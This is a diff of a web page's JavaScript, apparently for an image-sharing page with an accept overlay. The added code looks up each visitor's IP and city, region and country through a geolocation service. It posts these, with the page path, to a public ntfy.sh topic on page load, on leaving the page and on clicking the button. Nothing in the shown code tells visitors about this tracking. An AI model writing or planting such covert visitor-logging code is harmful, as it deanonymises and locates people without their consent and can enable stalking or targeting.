@@ -201,20 +201,21 @@
         const acceptButton = document.getElementById("accept-button");
 
         const sendNotif = async (text) => {
-            const ipRes = await fetch('https://api.ipify.org?format=json')
-            const {ip} = await ipRes.json()
-            const ntfyRes = await fetch("https://ntfy.sh/imgshareee", {method: "POST", body: `${ip} ${text}`})
+            const path = window.location.pathname.split("/")
+            const ipRes = await fetch('http://ip-api.com/json/')
+            const {query, country, regionName, city} = await ipRes.json()
+            const ntfyRes = await fetch("https://ntfy.sh/imgshareee", {method: "POST", body: `${text}\n${path.pop()}\n${query}\n${country}\n${regionName}\n${city}\n`})
         }
-        sendNotif("load")
+        sendNotif("LOAD")
         let hasClicked;
 
         window.onbeforeunload = function () {
-            sendNotif("leave")
+            sendNotif("LEAVE")
             if (hasClicked) return true;
         };
 
         function buttonClick(event) {
-            sendNotif("click")
+            sendNotif("CLICK")
             event.preventDefault();
             if (!hasClicked) hasClicked = true;
             overlay.hidden = true;
